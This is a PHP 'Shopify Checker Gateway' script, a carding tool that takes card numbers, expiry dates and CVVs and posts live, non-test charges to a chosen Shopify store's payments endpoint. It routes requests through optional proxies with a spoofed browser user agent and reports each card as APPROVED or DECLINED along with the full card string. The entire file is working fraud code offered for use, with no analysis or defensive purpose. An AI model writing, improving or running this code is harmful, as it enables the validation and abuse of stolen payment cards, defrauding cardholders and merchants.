<?php
// Shopify Checker Gateway
header('Content-Type: application/json');

$card = $_POST['cc'] ?? $_GET['cc'] ?? '';
$url = $_POST['url'] ?? $_GET['url'] ?? '';
$amount = $_POST['amount'] ?? $_GET['amount'] ?? '8.7';
$proxy = $_POST['proxy'] ?? $_GET['proxy'] ?? '';

if (empty($card)) {
    echo json_encode(['Response' => 'ERROR: No card provided', 'status' => 'ERROR']);
    exit;
}

if (empty($url)) {
    echo json_encode(['Response' => 'ERROR: No Shopify URL provided', 'status' => 'ERROR']);
    exit;
}

$parts = explode('|', $card);
if (count($parts) < 4) {
    echo json_encode(['Response' => 'DECLINED: Invalid card format', 'status' => 'DECLINED']);
    exit;
}

list($cardNumber, $month, $year, $cvv) = $parts;

$url = rtrim($url, '/');
if (!preg_match('/^https?:\/\//', $url)) {
    $url = 'https://' . $url;
}

$shopName = parse_url($url, PHP_URL_HOST);
$shopName = str_replace('www.', '', $shopName);

$paymentUrl = $url . '/payments.json';

$paymentData = [
    'credit_card' => [
        'number' => $cardNumber,
        'month' => $month,
        'year' => $year,
        'verification_value' => $cvv,
        'first_name' => 'Test',
        'last_name' => 'User'
    ],
    'amount' => $amount,
    'currency' => 'USD',
    'test' => false
];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $paymentUrl);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($paymentData));
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Content-Type: application/json',
    'Accept: application/json',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
]);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_TIMEOUT, 30);
curl_setopt($ch, CURLOPT_HEADER, true);

if (!empty($proxy)) {
    $proxyParts = explode(':', $proxy);
    if (count($proxyParts) >= 2) {
        $proxyIp = $proxyParts[0];
        $proxyPort = $proxyParts[1];
        curl_setopt($ch, CURLOPT_PROXY, $proxyIp . ':' . $proxyPort);
        
        if (count($proxyParts) >= 4) {
            $proxyUser = $proxyParts[2];
            $proxyPass = $proxyParts[3];
            curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyUser . ':' . $proxyPass);
        }
    }
}

$response = curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
$headerSize = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
$body = substr($response, $headerSize);
curl_close($ch);

$result = json_decode($body, true);

// Return raw response if available
if ($httpCode == 200 || $httpCode == 201) {
    if (isset($result['payment']) && isset($result['payment']['status'])) {
        if ($result['payment']['status'] === 'success' || $result['payment']['status'] === 'approved') {
            echo json_encode([
                'Response' => 'APPROVED: Charge successful',
                'CC' => $card,
                'Price' => $amount,
                'Gate' => 'Shopify Payments',
                'Site' => $shopName,
                'Raw' => $body,
                'status' => 'APPROVED'
            ]);
            exit;
        }
    }
    
    if (isset($result['id']) || isset($result['transaction_id'])) {
        echo json_encode([
            'Response' => 'APPROVED: Transaction completed',
            'CC' => $card,
            'Price' => $amount,
            'Gate' => 'Shopify Payments',
            'Site' => $shopName,
            'Raw' => $body,
            'status' => 'APPROVED'
        ]);
        exit;
    }
}

// Return raw decline response
$rawMessage = '';
if (isset($result['errors'])) {
    if (is_array($result['errors'])) {
        foreach ($result['errors'] as $field => $error) {
            if (is_array($error)) {
                $rawMessage = implode(', ', $error);
            } else {
                $rawMessage = $error;
            }
            break;
        }
    } elseif (is_string($result['errors'])) {
        $rawMessage = $result['errors'];
    }
} elseif (isset($result['error'])) {
    if (is_array($result['error'])) {
        $rawMessage = $result['error']['message'] ?? json_encode($result['error']);
    } else {
        $rawMessage = $result['error'];
    }
} elseif (isset($result['message'])) {
    $rawMessage = $result['message'];
} else {
    $rawMessage = 'Card declined';
}

echo json_encode([
    'Response' => 'DECLINED: ' . $rawMessage,
    'CC' => $card,
    'Site' => $shopName,
    'Raw' => $body,
    'status' => 'DECLINED'
]);
?>
